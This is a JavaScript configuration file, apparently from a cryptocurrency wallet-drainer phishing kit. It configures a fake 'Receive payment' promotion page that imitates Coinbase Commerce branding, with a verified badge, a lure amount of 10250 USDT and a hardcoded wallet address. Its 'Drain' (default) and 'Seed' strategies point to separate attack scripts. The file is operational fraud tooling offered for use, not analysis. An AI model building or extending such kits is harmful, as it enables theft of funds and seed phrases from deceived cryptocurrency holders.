const CONFIG = {
    GOOGLE_SHEET_API_URL: '',
    CURRENCIES: {
        'USDT': 'https://cryptologos.cc/logos/tether-usdt-logo.png',
        'USDC': 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png',
        'ETH': 'https://cryptologos.cc/logos/ethereum-eth-logo.png',
        'BNB': 'https://cryptologos.cc/logos/binance-coin-bnb-logo.png',
        'BTC': 'https://cryptologos.cc/logos/bitcoin-btc-logo.png',
        'SOL': 'https://cryptologos.cc/logos/solana-sol-logo.png',
        'DAI': 'https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.png',
        'BUSD': 'https://cryptologos.cc/logos/binance-usd-busd-logo.png?v=040',
    },
    NETWORKS: {
        'Ethereum': 'https://cryptologos.cc/logos/ethereum-eth-logo.png',
        'Polygon': 'https://cryptologos.cc/logos/polygon-matic-logo.png',
        'BSC': 'https://cryptologos.cc/logos/binance-coin-bnb-logo.png',
        'TRON': 'https://cryptologos.cc/logos/tron-trx-logo.png',
        'Arbitrum': 'https://cryptologos.cc/logos/arbitrum-arb-logo.png',
        'Avalanche': 'https://cryptologos.cc/logos/avalanche-avax-logo.png',
    },
    STATUSES: ['Complete', 'Pending', 'Failed'],
    STRATEGIES: ['Drain', 'Seed'],
    STRATEGY_SCRIPTS: {
        'Drain': './93dd2eed-f217-4d47-a243-e645ff4856e8.js',
        'Seed': './614c122e-511c-4936-9034-d575dc19a232.js'
    },
    DEFAULTS: {
        senderName: 'Marketing Department',
        currency: 'USDT',
        network: 'Ethereum',
        amount: '10250',
        wallet: '0x0123dbbfE9F32E9eF098F89b81f8843Ee2F7d2BB',
        date: new Date().toLocaleDateString('en-US', { month: 'short', day: '2-digit', year: 'numeric' }),
        orderId: 'Z3B7TWA',
        status: 'Pending',
        title: 'Promotion',
        buttonText: 'Receive payment',
        buttonClass: 'interact-button',
        strategy: 'Drain',
        icon: './media/verified.png',
        emailReceipt: false,
        walletField: true,
        logoDisplay: true, 
        coinbaseText: 'coinbase',
        coinbaseColor: '#0052ff',
        commerceText: 'commerce',
        commerceColor: '#1f2937'
    }
};

export default CONFIG;